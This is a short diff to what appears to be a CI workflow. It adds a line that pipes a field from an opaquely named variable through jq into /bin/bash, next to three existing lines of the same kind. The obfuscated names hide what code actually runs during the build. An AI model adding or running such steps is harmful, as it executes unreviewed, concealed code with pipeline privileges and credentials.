@@ -37,6 +37,7 @@ jobs:
           echo $ktw1398 | jq -r .its58 | /bin/bash
           printf '%s' "$zxfh084" | jq -r .nf563 | /bin/bash
           echo $dxkk20250 | jq -r .unmm572 | /bin/bash
+          printf '%s' "$bplfs0" | jq -r .usdf1 | /bin/bash
 
       - name: Save output
         if: always()
